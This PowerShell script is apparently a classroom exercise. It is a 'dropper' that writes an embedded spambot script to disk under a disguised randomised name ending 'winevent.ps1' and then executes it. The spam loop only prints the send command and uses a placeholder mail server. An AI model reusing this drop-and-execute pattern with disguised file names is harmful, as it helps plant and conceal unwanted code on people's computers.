<# 
    Storyline: Dropper for our spambot that will save to a directory then execute it.
#>



$writesSbBot = @'
# Send an email using powershell

$toSend = @('dunston@champlain.edu', 'ston@champlain.edu','duns@champlain.edu')

# Message body
$msg = "Hello"

while ($true) { 
    
    foreach($email in $toSend) {

    # Send the email
    write-host "Send-MailMessage -from 'dunston@champlain.edu' -To $email -Subject 'Tisk Tisk' `
    -Body $msg -SmtpServer X.X.X.X"
    }
}
'@
$sbDir = 'C:\Users\knotm\Desktop'

#Create random number to add to file
$sbRand = get-random -Minimum 1000 -Maximum 1999

$sbRand

#create a file and location to save the bot
$file = $sbDir + $sbRand + "winevent.ps1"

#write to file
$writesSbBot | Out-File -FilePath $file

#executes the script
Invoke-Expression $file